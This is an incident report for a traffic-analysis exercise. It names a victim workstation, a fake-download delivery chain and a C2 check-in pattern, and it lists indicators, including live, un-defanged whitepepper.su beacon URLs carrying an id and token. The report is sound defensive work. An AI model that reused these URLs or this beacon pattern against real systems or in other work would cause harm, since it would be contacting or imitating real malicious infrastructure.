# Incident Report — MTA 2026-01-31 Traffic Analysis Exercise

**Capture window:** 2026-01-28 03:04:03 – 03:14:27 UTC (10m 24s, 51,181 packets)
**Evidence provided:** single pcap only, no IDS/Suricata alert export was present in the evidence directory.

## Victim host

| Field | Value | Source |
|---|---|---|
| IPv4 | **10.1.21.58** | conversation/ARP |
| MAC | **00:21:5d:c8:0e:f2** | ARP (10.1.21.58 ↔ this MAC, also seen as DHCP client MAC) |
| Windows hostname | **DESKTOP-ES9F3ML** (also broadcasting NetBIOS/workgroup name **WIN11OFFICE**) | NBNS, DHCP option 12 |
| Logged-in domain user | **gwyatt** | Kerberos `CNameString`, client 10.1.21.58 authenticating against DC 10.1.21.2 |

Domain controller for context: 10.1.21.2 (MAC 14:b3:1f:2d:ce:69) — heavy LDAP/Kerberos/DCERPC (SAMR/LSARPC) traffic to this host is normal AD background noise, not itself an indicator.

## Malware family

**Attribution: behavioral, not signature-confirmed** (no Suricata/IDS alert file was supplied with this evidence set).

Traffic shows a multi-stage fake-download delivery chain ending in a browser-masquerading stealer/loader check-in:

- The C2 client (whitepepper[.]su) fingerprints the victim by re-registering itself with different simulated browser identities (`agent=Chrome`, then `agent=Edge`) and explicitly logs each one back to the server (`act=log`). This "enumerate-installed-browsers-and-report" behavior is consistent with a commodity **credential/browser-data stealer or downloader** using an `/api/set_agent` telemetry panel. No public signature match was verified — treat the family name as **unconfirmed/behavioral** pending sandbox detonation or IDS signature review.

## Delivery chain (grounded via DNS + conversation timing)

| t (rel, sec) | Domain | Resolved IP | Role |
|---|---|---|---|
| 45.35 | hiyter[.]com | 104.21.22.231 | Entry/redirector |
| 45.92 | media.megafilehub4[.]lat | 104.21.48.156 | Fake file-hosting landing page |
| 48.36 | arch.filemegahab4[.]sbs | **104.21.46.67** | Payload host — 16 MB TLS transfer follows (see below) |
| 90.37 | whooptm[.]cyou | 62.72.32.156 | Intermediate hop |
| 92.34 | **whitepepper[.]su** | **153.92.1.49** | C2 check-in / beacon |

The 16 MB session to 104.21.46.67 is genuine TLS 1.3 (verified via raw handshake bytes: `16 03 01 …`, not plaintext) using **Encrypted Client Hello (ECH)** — the visible SNI is the Cloudflare ECH placeholder `cloudflare-ech.com`, but DNS resolution ties this IP directly to `arch.filemegahab4.sbs` at 48.36s, immediately after the fake file-hosting page. Payload content could not be inspected (no decryption keys in the capture) — file name/hash cannot be grounded and are **not reported**.

## Command-and-control indicators

- **whitepepper[.]su — 153.92.1.49**
  - Port 80 (plaintext HTTP, confirmed check-in):
    - `GET /api/set_agent?id=3BF67EC05320C5729578BE4C0ADF174C&token=842e2802df0f0a06b4ed51f12f4387e761523b&description=&agent=Chrome`
    - `POST /api/set_agent?id=3BF67EC05320C5729578BE4C0ADF174C&token=842e2802df0f0a06b4ed51f12f4387e761523b&description=&agent=Chrome&act=log`
    - `GET /api/set_agent?...&agent=Edge`
    - `POST /api/set_agent?...&agent=Edge&act=log`
    - `GET /favicon.ico`
  - Port 443/tcp: 18 separate TLS connections between t=92s and t=122s (roughly every 1–2s) — beaconing pattern, content encrypted/not recoverable.

## Full IOC list (all confirmed present in traffic)

**Domains**
- whitepepper[.]su — C2
- arch.filemegahab4[.]sbs — payload host
- media.megafilehub4[.]lat — fake download landing page
- hiyter[.]com — entry redirector
- whooptm[.]cyou — intermediate hop
- communicationfirewall-security[.]cc (104.21.9.36) — visited via TLS SNI, suspicious lookalike name, role not established beyond a visited host

**IP:port**
- 153.92.1.49:80 and 153.92.1.49:443 — C2
- 104.21.46.67:443 — payload delivery (ECH-obscured)
- 104.21.48.156:443 — landing page
- 104.21.22.231:443 — redirector
- 62.72.32.156:443 — intermediate hop

**URLs**
- `http://whitepepper.su/api/set_agent?id=3BF67EC05320C5729578BE4C0ADF174C&token=842e2802df0f0a06b4ed51f12f4387e761523b&description=&agent=Chrome`
- `http://whitepepper.su/api/set_agent?id=3BF67EC05320C5729578BE4C0ADF174C&token=842e2802df0f0a06b4ed51f12f4387e761523b&description=&agent=Chrome&act=log`
- `http://whitepepper.su/api/set_agent?id=3BF67EC05320C5729578BE4C0ADF174C&token=842e2802df0f0a06b4ed51f12f4387e761523b&description=&agent=Edge`
- `http://whitepepper.su/api/set_agent?id=3BF67EC05320C5729578BE4C0ADF174C&token=842e2802df0f0a06b4ed51f12f4387e761523b&description=&agent=Edge&act=log`

**Files / hashes**
None. No plaintext file transfer was observed. Earlier automated object extraction over the 104.21.46.67 TLS session produced apparent PE/ZIP artifacts, but the underlying stream was verified (via raw record header inspection) to be genuinely encrypted TLS 1.3 with no key material available — those "extracted" objects are dissection artifacts, not real evidence, and have been discarded rather than reported.

## Not indicators (benign context)

- Standard Windows/Microsoft telemetry, NCSI checks, Google/MSN/Bing/Adobe/Skype traffic — background noise.
- LDAP/Kerberos/DCERPC (SAMR, LSARPC) traffic between 10.1.21.58 and DC 10.1.21.2 — normal domain-joined workstation behavior.
